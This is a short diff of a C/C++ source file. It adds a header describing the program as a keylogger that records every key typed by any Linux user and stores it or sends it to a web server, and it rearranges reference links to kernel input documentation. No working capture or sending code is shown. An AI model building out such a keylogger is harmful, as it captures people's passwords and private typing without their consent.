@@ -1,10 +1,22 @@
+/**
+ * keylog - This software reads and stores or sends 
+ * to a web server every key typed by any user on
+ * linux.
+ */
+
 #include <stdio.h>
 #include <iostream>
 #include <vector>
 #include <ctime>
 
-/* See https://manpages.ubuntu.com/manpages/impish/man3/timeval.3bsd.html */
-/* https://github.com/torvalds/linux/blob/master/include/uapi/linux/input-event-codes.h */
+/**
+ * Time:
+ * https://manpages.ubuntu.com/manpages/impish/man3/timeval.3bsd.html
+ *
+ * Key Input:
+ * https://www.kernel.org/doc/Documentation/input/input.txt
+ * https://github.com/torvalds/linux/blob/master/include/uapi/linux/input-event-codes.h
+ */
 
 /*
 struct input_event {
